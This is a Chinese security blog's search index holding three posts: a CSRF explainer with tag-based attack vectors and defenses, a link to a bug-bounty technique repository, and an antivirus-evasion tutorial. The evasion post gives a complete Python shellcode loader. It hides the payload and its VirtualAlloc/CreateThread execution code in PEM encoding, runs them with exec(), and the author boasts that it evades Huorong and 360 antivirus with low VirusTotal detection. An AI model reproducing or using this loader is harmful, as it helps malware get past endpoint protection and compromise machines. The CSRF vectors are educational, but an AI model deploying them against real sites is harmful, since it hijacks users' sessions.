<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>重新研究一下CSRF的攻击与防御</title>
      <link href="/2022/04/14/%E9%87%8D%E6%96%B0%E7%A0%94%E7%A9%B6%E4%B8%80%E4%B8%8BCSRF%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
      <url>/2022/04/14/%E9%87%8D%E6%96%B0%E7%A0%94%E7%A9%B6%E4%B8%80%E4%B8%8BCSRF%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p><strong>定义：</strong></p><p>跨站请求伪造</p><p>挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</p><p><strong>对比XSS：</strong> 跟跨网站脚本(XSS)相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.用户C打开浏览器，访问受信任网站<span class="selector-tag">A</span>，输入用户名和密码请求登录网站<span class="selector-tag">A</span>;</span><br><span class="line"><span class="number">2</span>.在用户信息通过验证后，网站<span class="selector-tag">A</span>产生Cookie信息并返回给浏览器，此时用户登录网站<span class="selector-tag">A</span>成功，可以正常发送请求到网站<span class="selector-tag">A</span>;</span><br><span class="line"><span class="number">3</span>.用户未退出网站<span class="selector-tag">A</span>之前，在同一浏览器中，打开一个TAB页访问网站<span class="selector-tag">B</span>;</span><br><span class="line"><span class="number">4</span>.网站<span class="selector-tag">B</span>接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点<span class="selector-tag">A</span>;</span><br><span class="line"><span class="number">5</span>.浏览器在接收到这些攻击性代码后，根据网站<span class="selector-tag">B</span>的请求，在用户不知情的情况下携带Cookie信息，向网站<span class="selector-tag">A</span>发出请求。网站<span class="selector-tag">A</span>并不知道该请求其实是由<span class="selector-tag">B</span>发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站<span class="selector-tag">B</span>的恶意代码被执行。</span><br></pre></td></tr></table></figure><p><strong>要被CSRF攻击，必须同时满足两个条件：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 登录受信任网站<span class="selector-tag">A</span>，并在本地生成Cookie。</span><br><span class="line"><span class="number">2</span>. 在不登出<span class="selector-tag">A</span>的情况下，访问危险网站<span class="selector-tag">B</span>。</span><br></pre></td></tr></table></figure><h2 id="GET型CSRF"><a href="#GET型CSRF" class="headerlink" title="GET型CSRF"></a>GET型CSRF</h2><h5 id="乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）"><a href="#乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）" class="headerlink" title="乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）"></a>乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）</h5><p><a href="https://wooyun.website/show.php?uid=S8XttXpbELTcgJTjRpr0Gq6dLdNmnRagM9rJmzPt">https://wooyun.website/show.php?uid=S8XttXpbELTcgJTjRpr0Gq6dLdNmnRagM9rJmzPt</a></p><h5 id="新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）"><a href="#新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）" class="headerlink" title="新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）"></a>新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）</h5><p><a href="https://wooyun.website/show.php?uid=6HimWDmTrwk2d0kEhtwey5NJihxQEID4pPWgrsWp">https://wooyun.website/show.php?uid=6HimWDmTrwk2d0kEhtwey5NJihxQEID4pPWgrsWp</a></p><h2 id="POST型CSRF"><a href="#POST型CSRF" class="headerlink" title="POST型CSRF"></a>POST型CSRF</h2><h5 id="中国网络电视台官方CSRF刷微博粉"><a href="#中国网络电视台官方CSRF刷微博粉" class="headerlink" title="中国网络电视台官方CSRF刷微博粉"></a>中国网络电视台官方CSRF刷微博粉</h5><p><a href="https://wooyun.website/show.php?uid=pmxEDefy2wx977fTMeNj9NCHGkxJ5eTMh3pUlXPh">https://wooyun.website/show.php?uid=pmxEDefy2wx977fTMeNj9NCHGkxJ5eTMh3pUlXPh</a></p><h5 id="新浪微博csrf刷粉丝"><a href="#新浪微博csrf刷粉丝" class="headerlink" title="新浪微博csrf刷粉丝"></a>新浪微博csrf刷粉丝</h5><p><a href="https://wooyun.website/show.php?uid=eUTLauXnYMYB2oRcmcV6F4krh3q0HyGJF9IcMnyC">https://wooyun.website/show.php?uid=eUTLauXnYMYB2oRcmcV6F4krh3q0HyGJF9IcMnyC</a></p><h2 id="补充一点东西"><a href="#补充一点东西" class="headerlink" title="补充一点东西"></a>补充一点东西</h2><h4 id="GET-CSRF使用方法"><a href="#GET-CSRF使用方法" class="headerlink" title="GET CSRF使用方法"></a>GET CSRF使用方法</h4><p>GET请求不一定必须限制为FORM表单，JS请求进行提交，img、iframe、link等标签，css属性都可以进行GET请求</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. script标签利用</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>&gt;请点击我</span><br><span class="line">2. iframe利用</span><br><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">3. img标签利用</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>/&gt;</span><br><span class="line">远程加载图片，这个利用点一般在引入远程图片时，例如 头像</span><br><span class="line">4.link标签利用</span><br><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attribute">type</span>=<span class="string">&#x27;text/css&#x27;</span> <span class="attribute">href</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>&gt;</span><br><span class="line">4. CSS - backgroud利用</span><br><span class="line">利用 CSS中 background样式中的url来加载远程机器上的内容，从而对url中的内容发送HTTP请求</span><br><span class="line">body</span><br><span class="line">&#123;background:url(<span class="string">&quot;恶意CSRF_URL&quot;</span>);&#125;</span><br></pre></td></tr></table></figure><h2 id="CSRF蠕虫"><a href="#CSRF蠕虫" class="headerlink" title="CSRF蠕虫"></a>CSRF蠕虫</h2><h5 id="音悦台一处CSRF（2）-已经证明可构造蠕虫"><a href="#音悦台一处CSRF（2）-已经证明可构造蠕虫" class="headerlink" title="音悦台一处CSRF（2）[已经证明可构造蠕虫]"></a>音悦台一处CSRF（2）[已经证明可构造蠕虫]</h5><p><a href="https://wooyun.website/show.php?uid=0uuWjJIpThFyMfSHQaiWRvV9YutUbbnmD9NAz6MD">https://wooyun.website/show.php?uid=0uuWjJIpThFyMfSHQaiWRvV9YutUbbnmD9NAz6MD</a></p><h2 id="XSS-CSRF组合拳"><a href="#XSS-CSRF组合拳" class="headerlink" title="XSS+CSRF组合拳"></a>XSS+CSRF组合拳</h2><p>普通的CSRF需要诱导受害者点击构造的CSRF连接，但当CSRF与XSS组合之后，就能实现无意识的攻击了</p><h5 id="壹心理存储型XSS-CSRF造成蠕虫攻击"><a href="#壹心理存储型XSS-CSRF造成蠕虫攻击" class="headerlink" title="壹心理存储型XSS+CSRF造成蠕虫攻击"></a>壹心理存储型XSS+CSRF造成蠕虫攻击</h5><p><a href="https://wooyun.website/show.php?uid=wWfl0XRqzAeneYfhEsjb0tmnQ71JE6xqubtOH5kl">https://wooyun.website/show.php?uid=wWfl0XRqzAeneYfhEsjb0tmnQ71JE6xqubtOH5kl</a></p><h2 id="在业界目前防御-CSRF-攻击主要有四种策略"><a href="#在业界目前防御-CSRF-攻击主要有四种策略" class="headerlink" title="在业界目前防御 CSRF 攻击主要有四种策略"></a>在业界目前防御 CSRF 攻击主要有四种策略</h2><ol><li>验证 HTTP Referer 字段；</li><li>在请求地址中添加 token 并验证；</li><li>在 HTTP 头中自定义属性并验证；</li><li>Chrome 浏览器端启用 SameSite cookie</li></ol><p>对于绕过的方法，之后再讲</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC姿势(一)</title>
      <link href="/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/"/>
      <url>/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="SRC姿势-一"><a href="#SRC姿势-一" class="headerlink" title="SRC姿势(一)"></a>SRC姿势(一)</h1><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204141050517.png"></p><p>github地址：<a href="https://github.com/LiAoRJ/src">LiAoRJ&#x2F;src: SRC姿势收集 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀研究（1）Python加密混淆shellcode</title>
      <link href="/2022/04/13/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6%EF%BC%881%EF%BC%89Python%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86shellcode/"/>
      <url>/2022/04/13/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6%EF%BC%881%EF%BC%89Python%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86shellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀研究（1）Python加密混淆shellcode"><a href="#免杀研究（1）Python加密混淆shellcode" class="headerlink" title="免杀研究（1）Python加密混淆shellcode"></a>免杀研究（1）Python加密混淆shellcode</h1><p>加密的方式有很多，例如Xor异或，Base64等等，其实加密算法不重要，重要的是一定要加密，本文将使用Python利用PyCrypto库对shellcode进行混淆测试。</p><h2 id="pycryptodome"><a href="#pycryptodome" class="headerlink" title="pycryptodome"></a>pycryptodome</h2><p>PyCryptodome 是 PyCrypto 的一个分支。这是一个跟密码学相关的模块，可以实现各种加密方式的加解密。<br><strong>官方文档：</strong><a href="https://pycryptodome.readthedocs.io/en/latest/src/introduction.html">https://pycryptodome.readthedocs.io/en/latest/src/introduction.html</a><br><strong>安装</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome -i https://pypi.douban.com/simple</span><br></pre></td></tr></table></figure><p><strong>API</strong></p><table><thead><tr><th>Package</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/cipher/cipher.html">Crypto.Cipher</a></td><td>用于加密和解密数据（例如：AES）。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/signature/signature.html">Crypto.Signature</a></td><td>用于创建和验证消息的数字签名  （例如：PKCS#1 v1.5）。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/hash/hash.html">Crypto.Hash</a></td><td>用于创建加密 <strong>摘要</strong>  （例如：SHA-256）。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/public_key/public_key.html">Crypto.PublicKey</a></td><td>用于生成、导出或导入的模块  <em>公钥</em> （例如：RSA 或 ECC）。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/protocol/protocol.html">Crypto.Protocol</a></td><td>促进安全通信的模块 各方之间，在大多数情况下通过利用密码原语 来自其他模块。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/io/io.html">Crypto.IO</a></td><td>处理常用编码的模块 用于加密数据（例如：PEM）。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/random/random.html">Crypto.Random</a></td><td>用于生成随机数据的模块。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/util/util.html">Crypto.Util</a></td><td>通用（例如：XOR for byte 字符串）。</td></tr></tbody></table><h3 id="Crypto-IO-PEM"><a href="#Crypto-IO-PEM" class="headerlink" title="Crypto.IO.PEM"></a>Crypto.IO.PEM</h3><p>根据 PEM 格式封装数据的一组函数。</p><p>PEM（隐私增强邮件）是 IETF 标准，用于通过公钥基础设施保护电子邮件。它在 RFC 1421-1424 中指定。即使它已被放弃，它定义的简单消息封装今天仍然广泛用于将二进制加密对象（如密钥和证书）编码为文本。</p><p><strong>Crypto.IO.PEM.encode &amp; Crypto.IO.PEM.decode</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.IO <span class="keyword">import</span> PEM</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="comment"># passphrase：可以指定密钥</span></span><br><span class="line"><span class="comment"># marker：自己指定名称</span></span><br><span class="line">buf = PEM.encode(buf, marker=<span class="string">&quot;shellcode&quot;</span>, passphrase=<span class="literal">None</span>, randfunc=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">PEM.decode(buf, passphrase=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> Crypto.IO <span class="keyword">import</span> PEM</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密后的shellcode</span></span><br><span class="line">buf = <span class="string">&quot;&quot;&quot; &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(PEM.decode(buf, passphrase=<span class="literal">None</span>)[<span class="number">0</span>])</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>执行上线试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> Crypto.IO <span class="keyword">import</span> PEM</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="comment">#buf = b&quot;&quot;</span></span><br><span class="line"><span class="comment">#passphrase：可以指定密钥</span></span><br><span class="line"><span class="comment">#marker：自己指定名称</span></span><br><span class="line"><span class="comment"># buf = PEM.encode(buf, marker=&quot;shellcode&quot;, passphrase=None, randfunc=None)</span></span><br><span class="line"><span class="comment"># print(buf)</span></span><br><span class="line"><span class="comment">#加密后</span></span><br><span class="line">buf = <span class="string">&quot;&quot;&quot;-----BEGIN shellcode-----</span></span><br><span class="line"><span class="string">XXXXX</span></span><br><span class="line"><span class="string">-----END shellcode-----&quot;&quot;&quot;</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(PEM.decode(buf, passphrase=<span class="literal">None</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#execode加密前</span></span><br><span class="line"><span class="comment"># execode = PEM.encode(b&quot;&quot;&quot;ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span></span><br><span class="line"><span class="comment"># ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span></span><br><span class="line"><span class="comment"># buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="comment"># ctypes.windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="comment">#     ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="comment">#     buf,</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(len(shellcode))</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># handle = ctypes.windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(0),</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(0),</span></span><br><span class="line"><span class="comment">#     ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(0),</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(0),</span></span><br><span class="line"><span class="comment">#     ctypes.pointer(ctypes.c_int(0))</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))&quot;&quot;&quot;, marker=&quot;execcute code&quot;,</span></span><br><span class="line"><span class="comment">#                  passphrase=None, randfunc=None))</span></span><br><span class="line"><span class="comment">#execode加密后</span></span><br><span class="line">execode=<span class="string">&quot;&quot;&quot;-----BEGIN execcute code-----</span></span><br><span class="line"><span class="string">XXXXX</span></span><br><span class="line"><span class="string">-----END execcute code-----&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(PEM.decode(execode, passphrase=<span class="literal">None</span>)[<span class="number">0</span>].decode())</span><br><span class="line"><span class="built_in">exec</span>(PEM.decode(execode, passphrase=<span class="literal">None</span>)[<span class="number">0</span>].decode())</span><br></pre></td></tr></table></figure><p>这里我封装成exe测试下上线，可绕过火绒、360执行命令,如下图。</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204131635439.png"></p><p>virustotal查杀率7&#x2F;67 <strong>(测试时间2022年4月13日)</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204131635472.png"></p><p>本文参考自<a href="https://xz.aliyun.com/t/10999">免杀之代码混淆 - 先知社区 (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 免杀研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀研究 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
